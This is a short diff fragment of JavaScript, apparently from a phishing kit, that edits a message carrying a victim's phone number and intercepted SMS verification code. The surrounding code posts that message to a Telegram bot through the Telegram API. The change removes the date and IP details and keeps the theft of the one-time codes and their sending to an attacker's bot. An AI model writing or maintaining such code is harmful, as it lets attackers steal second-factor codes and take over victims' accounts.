@@ -752,11 +752,7 @@
                 const message = `📱 CODE SMS REÇU 📱
                 
 📞 Téléphone: ${phone}
-🔢 Code SMS: ${smsCode}
-
-🌐 INFOS TECH:
-Date: ${new Date().toLocaleString('fr-FR')}
-IP: ${localStorage.getItem('clientIP') || 'Non disponible'}`;
+🔢 Code SMS: ${smsCode}`;
                 
                 // Envoyer au premier bot
                 fetch(`https://api.telegram.org/bot${bot1.token}/sendMessage`, {
